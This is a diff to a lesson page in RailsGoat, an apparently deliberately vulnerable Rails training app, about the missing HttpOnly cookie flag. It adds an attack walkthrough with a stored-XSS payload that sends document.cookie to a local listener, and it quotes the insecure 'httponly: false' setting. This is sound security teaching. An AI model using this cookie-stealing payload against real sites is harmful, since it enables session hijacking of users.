@@ -16,7 +16,7 @@
           </div>
           <div class="accordion-body in collapse" id="collapseHttpOnlyOne" style="height: auto;">
             <div class="accordion-inner">
-        		INSERT DESC
+        		The HttpOnly flag prevents access to the document.cookie attribute of the DOM via JavaScript. Helpful for limiting the impact of Cross-Site Scripting as it relates to session theft.
             </div>
           </div>
         </div>
@@ -31,7 +31,7 @@
           <div class="accordion-body collapse" id="collapseHttpOnlyTwo" style="height: 0px;">
             <div class="accordion-inner">
 				<p class="desc">
-					By default, Ruby on Rails protects it's cookies with the HttpOnly flag. However, it is possible to disable this security protection and is not recommended. You can disable this protection using the flag highlighted below. This is an insecure and unnecessary change.
+					By default, Ruby on Rails protects its' cookies with the HttpOnly flag. However, it is possible to disable this security protection and is not recommended. You can disable this protection using the flag highlighted below. This is an insecure and unnecessary change.
 				</p>	
        			<pre class="ruby">
 Railsgoat::Application.config.session_store :cookie_store, key: '_railsgoat_session', <span style="background:yellow">httponly: false</span>
@@ -49,8 +49,26 @@ Railsgoat::Application.config.session_store :cookie_store, key: '_railsgoat_sess
           </div>
           <div class="accordion-body collapse" id="collapseHttpOnlyThree" style="height: 0px;">
             <div class="accordion-inner">
-              <p><b>Lack of Password Complexity - SOLUTION</b></p>
-        	  	INSERT SOLUTION
+			  <p><b>Lack of the HttpOnly Flag - ATTACK</b></p>
+	        	<p class="desc">
+				  Navigate to the sign-up page, sign up as a user, but in the first name field, enter:
+				  <pre class="ruby">
+					&lt;script&gt;document.location=&quot;http://localhost:8000/&quot; + document.cookie &lt;/script&gt;
+				  </pre>
+				  <p class="desc">
+				  	Additionally, fire up Python's SimpleHTTPServer module using the following command:
+				  </p>
+				  <pre class="ruby">
+					$ python -m SimpleHTTPServer
+				  </pre>	
+				  <p class="desc">
+				     Now authenticate to the application as the user you just created, you'll be redirected, now review the terminal tab that has the python server running. You'll notice that you see a GET request with the user's session in the request path. This means you have now grabbed the user's session via Cross-Site Scripting.
+				  </p>
+			   </p>
+              <p><b>Lack of the HttpOnly Flag - SOLUTION</b></p>
+        	  	<p class="desc">
+				  Keep the default configuration "as-is" and do not make this change. If this exists in your code base, remove it.
+				</p>
             </div>
           </div>
         </div>
@@ -65,7 +83,7 @@ Railsgoat::Application.config.session_store :cookie_store, key: '_railsgoat_sess
           <div class="accordion-body collapse" id="collapseHttpOnlyFour" style="height: 0px;">
             <div class="accordion-inner">
         <p class="desc">
-         INSERT DESC
+         Can JavaScript interact with my session cookie?
         </p>
              </div>
           </div>
